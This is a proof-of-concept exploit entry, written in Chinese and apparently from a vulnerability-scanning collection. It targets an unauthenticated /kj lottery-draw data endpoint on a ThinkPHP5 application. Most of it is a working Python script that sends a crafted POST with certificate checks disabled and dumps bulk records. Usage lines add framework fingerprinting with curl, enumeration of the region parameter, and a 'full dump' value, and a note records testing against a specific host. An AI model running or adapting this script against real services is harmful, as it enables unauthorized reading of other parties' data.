# ThinkPHP5 /kj 开奖数据接口未授权读取

- **code**: thinkphp5-kj-开奖数据接口未授权读取
- **kind**: poc
- **category**: unauthorized
- **component**: ThinkPHP5 自研开奖API
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-15 在 203.0.113.57:20248 实测：POST /kj {"g":"am","s":500} → 200 / 96,277 字节，g=tw → 93,923 字节，s=99999 → 452,503 字节。无任何鉴权头要求，CORS Access-Control-Allow-Origin: *。
- **path**: pocs/thinkphp5-kj-开奖数据接口未授权读取/tp5_kj_unauth.py
- **tags**: thinkphp5,unauthorized,api,json,博彩
- **created_at**: 2026-10-15T20:39:30.129Z
- **found_by**: vuln-scan

## 描述

ThinkPHP5 开奖数据接口 /kj 无鉴权：POST JSON {"g":"am","s":500} 即返回全量开奖记录。CORS 全开。g 值为地区分组（am=澳门、tw=台湾），s 为返回条数（99999=全量）。

## 用法

```
python3 tp5_kj_unauth.py 203.0.113.57 20248 am 500
# 框架确认: curl -sk https://HOST:PORT/think  → hello,ThinkPHP5!
# 分组枚举: g=am / g=tw 有效（其余地区返回 500）
# 全量: s=99999
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkPHP5 未授权开奖数据接口读取验证。
用法: python3 tp5_kj_unauth.py <host> <port> [g] [s]
"""
import json
import socket
import ssl
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "203.0.113.57"
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 20248)
G = sys.argv[3] if len(sys.argv) > 3 else "am"      # am=澳门 tw=台湾
S = int(sys.argv[4] if len(sys.argv) > 4 else 500)  # 条数，99999 取全量

body = json.dumps({"g": G, "s": S})
s = socket.create_connection((HOST, PORT), timeout=15)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(s, server_hostname=HOST)
req = (f"POST /kj HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
       f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
       f"Referer: https://{HOST}:{PORT}/jilu/\r\nConnection: close\r\n\r\n{body}")
s.sendall(req.encode())
data = b""
while len(data) < 2_000_000:
    c = s.recv(65536)
    if not c:
        break
    data += c
s.close()
b = data.split(b"\r\n\r\n", 1)[1]
j = json.loads(b[b.find(b"{"):b.rfind(b"}") + 1])
rows = j.get("data") or []
print(f"[+] 未授权读取成功: {len(rows)} 条")
for r in rows[:3]:
    print("   ", r.get("date"), r.get("qishu"), r.get("num"))

# 指纹确认（框架识别）

```
